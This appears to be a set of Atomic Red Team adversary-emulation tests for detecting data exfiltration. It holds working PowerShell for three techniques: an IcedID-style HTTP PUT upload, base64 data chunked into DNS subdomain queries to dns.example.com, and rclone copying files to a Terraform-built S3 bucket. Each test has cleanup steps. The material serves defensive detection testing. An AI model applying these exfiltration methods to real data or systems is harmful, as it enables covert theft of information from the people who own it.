## IcedID Botnet HTTP PUT
MITRE ATT&CK: T1020 (Automated Exfiltration)

Creates a text file
Tries to upload to a server via HTTP PUT method with ContentType Header
Deletes a created file

### Command (powershell)
```powershell
$fileName = "C:\temp\T1020_exfilFile.txt"
$url = "https://google.com"
$file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test"
$contentType = "application/octet-stream"
try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}
```

### Cleanup
```powershell
$fileName = "C:\temp\T1020_exfilFile.txt"
Remove-Item -Path $fileName -ErrorAction Ignore
```

## Text Based Data Exfiltration using DNS subdomains
MITRE ATT&CK: T1041 (Exfiltration Over C2 Channel)

Simulates an adversary using DNS tunneling to exfiltrate data over a Command and Control (C2) channel.

### Command (powershell)
```powershell
$dnsServer = "dns.example.com"
$exfiltratedData = "SecretDataToExfiltrate"
$chunkSize = 63

$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)
$encodedData = [Convert]::ToBase64String($encodedData)
$chunks = $encodedData -split "(.{$chunkSize})"

foreach ($chunk in $chunks) {
    $dnsQuery = $chunk + "." + $dnsServer
    Resolve-DnsName -Name $dnsQuery
    Start-Sleep -Seconds 5
}
```

## Exfiltrate data with rclone to cloud Storage - AWS S3
MITRE ATT&CK: T1567.002 (Exfiltration Over Web Service: Exfiltration to Cloud Storage)

This test uses rclone to exfiltrate data to a remote cloud storage instance. (AWS S3)
See https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/

### Command (powershell)
```powershell
Write-Host "Deploying AWS infrastructure... " -NoNewLine
$awsAccessKey = ""
$awsSecretKey = ""
cd C:\AtomicRedTeam\atomics/T1567.002/src/
if ($awsAccessKey -eq "" -or $awsSecretKey -eq "") {
  $env:AWS_PROFILE = "default"
} else {
  $env:AWS_ACCESS_KEY_ID = "$awsAccessKey"
  $env:AWS_SECRET_ACCESS_KEY = "$awsSecretKey"
}
$null = C:\AtomicRedTeam\atomics/../ExternalPayloads/T1567.002/terraform-v*/terraform init
$null = C:\AtomicRedTeam\atomics/../ExternalPayloads/T1567.002/terraform-v*/terraform apply -var "aws_region=us-east-1" -auto-approve
Write-Host "Done!"
Write-Host "Generating rclone config... " -NoNewLine
$config = @"
[exfils3]
type = s3
provider = AWS
env_auth = true
region = us-east-1
"@
$config | Out-File -FilePath "C:\AtomicRedTeam\atomics/../ExternalPayloads/T1567.002/rclone.conf" -Encoding ascii
Write-Host "Done!"
Write-Host "Exfiltrating data... " -NoNewLine
$bucket = "$(C:\AtomicRedTeam\atomics/../ExternalPayloads/T1567.002/terraform-v*/terraform output bucket)".Replace("`"","")
cd C:\AtomicRedTeam\atomics/../ExternalPayloads/T1567.002/rclone-v*
$null = ./rclone copy --max-size 1700k "C:\AtomicRedTeam\atomics/../ExternalPayloads/T1567.002/data/" exfils3:$bucket --config "C:\AtomicRedTeam\atomics/../ExternalPayloads/T1567.002/rclone.conf"
Write-Host "Done!"
```

### Cleanup

$awsAccessKey = ""
$awsSecretKey = ""
cd C:\AtomicRedTeam\atomics/T1567.002/src/

$null = C:\AtomicRedTeam\atomics/../ExternalPayloads/T1567.002/terraform-v*/terraform destroy -var "aws_region=us-east-1" -auto-approve
